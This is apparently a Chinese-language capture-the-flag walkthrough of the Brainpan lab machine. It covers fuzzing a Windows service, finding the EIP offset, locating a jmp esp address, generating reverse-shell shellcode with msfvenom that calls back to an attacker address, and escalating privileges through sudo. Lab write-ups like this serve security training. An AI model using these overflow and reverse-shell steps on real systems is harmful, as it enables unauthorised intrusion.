# brainpan

## brainpan渗透测试

[参考链接1](https://blog.csdn.net/qq_34801745/article/details/103949489)

[参考链接2](https://www.cnblogs.com/darklee/p/14466851.html)

[参考链接3](https://bbs.pediy.com/thread-255058.htm#msg_header_h3_5)

- 首先扫描靶机位置以及开放的端口

![image-20210706141719309](http://cdn.mxrblog.cn/image-20210706141719309.png)

- 可以看到靶机开启了9999和10000端口，其中10000端口开启了http服务，访问靶机的访问靶机的10000号端口服务

![image-20210706141902068](http://cdn.mxrblog.cn/image-20210706141902068.png)

- 没有什么有价值的线索， 扫描一下http服务的目录（扫描目录这个过程出现了一点小波折，总之把靶机重新启动一下就好了）

![image-20210706142317846](http://cdn.mxrblog.cn/image-20210706142317846.png)

- 返现bin目录下有东西，我们访问一下，发现可执行文件

![image-20210706143249570](http://cdn.mxrblog.cn/image-20210706143249570.png)

- 下载brainpan.exe到攻击机器

![image-20210706143436955](http://cdn.mxrblog.cn/image-20210706143436955.png)

- 是windows可执行文件，移至windows环境中，使用Immunity Debugger打开，然后运行

![image-20210707035547856](http://cdn.mxrblog.cn/image-20210707035547856.png)

- 在win10上开启的是9999端口，使用fuzz脚本进行模糊测试
- 在网上下载fuzz脚本进行下载,下载地址:

```
git clone https://github.com/jessekurrus/brainpan
```

- 通过看代码，可以知道brainfuzzer.py的内容是发送初始值为100的A，每次增加100个，直至程序崩溃

![image-20210707041122867](http://cdn.mxrblog.cn/image-20210707041122867.png)



- Executing brainfuzzer.py scrtpt, It wa found that a crash occurred at 700 A

![image-20210707035932038](http://cdn.mxrblog.cn/image-20210707035932038.png)

- 用msf生成1000个有规律的字符序列

```
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1000
```

![image-20210707053219397](http://cdn.mxrblog.cn/image-20210707053219397.png)

- 修改brainpan1.py, 将里面的序列替换成我们的

![image-20210707041454618](http://cdn.mxrblog.cn/image-20210707041454618.png)

- 重启Immunity Debugger上的brainpan.exe (Ctrl+F2), F9执行， 再在攻击机器上运行brainpan1.py

![image-20210707041835761](http://cdn.mxrblog.cn/image-20210707041835761.png)



- 可以发现此时的EIP地址是35724134

![image-20210707042149055](http://cdn.mxrblog.cn/image-20210707042149055.png)

- 使用mfs计算EIP的位置

```
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 35724134
```

- 为524

![image-20210707042342854](http://cdn.mxrblog.cn/image-20210707042342854.png)

- 修改brainpan2.py代码

![image-20210707053912035](http://cdn.mxrblog.cn/image-20210707053912035.png)

- 在攻击机器上执行brainpan2.py, 我们能发现EIP的地址已经是42424242（BBBB的16进制）， ESP的起始地址是005FF910

![image-20210707053948699](http://cdn.mxrblog.cn/image-20210707053948699.png)

- 寻找跳板 jmp esp ，在Immunity Debugger中 Ctrl+F4搜索 jmp esp, 得到地址为311712F3

![image-20210707074011842](http://cdn.mxrblog.cn/image-20210707074011842.png)

- 使用msfvenom创建我的反向shell有效shellcode
  - -p表示加载模块，-f python表示格式化为python代码，-b为坏字符

```
msfvenom -p linux/x86/shell_reverse_tcp -b "\x00\x0a\x0d" LHOST=192.168.1.8 LPORT=666 -f python
```

![image-20210707080646846](http://cdn.mxrblog.cn/image-20210707080646846.png)

- 修改brainpan4.py

![image-20210707080622710](http://cdn.mxrblog.cn/image-20210707080622710.png)

- 监听本地666号端口

![image-20210707080807444](http://cdn.mxrblog.cn/image-20210707080807444.png)

- 执行brainpan4.py

```
python brainpan4.py 192.168.1.6 9999   //注意，这次的地址不是win10的了，而是靶机的地址
```

![image-20210707083510729](http://cdn.mxrblog.cn/image-20210707083510729.png)

- 设置交互式shell

```
python -c 'import pty; pty.spawn("/bin/bash")'
```

![image-20210707085429547](http://cdn.mxrblog.cn/image-20210707085429547.png)

- 开始提权，看看有什么是现用户能使用的超级用户权力，使用sudo -l

![image-20210707083641954](http://cdn.mxrblog.cn/image-20210707083641954.png)

- 执行一下，发现命令还需要有三个参数，我们选择第三个

![image-20210707084110484](http://cdn.mxrblog.cn/image-20210707084110484.png)

```
sudo /home/anansi/bin/anansi_util manual cat
```

![image-20210707085613225](http://cdn.mxrblog.cn/image-20210707085613225.png)

![image-20210707085713346](http://cdn.mxrblog.cn/image-20210707085713346.png)

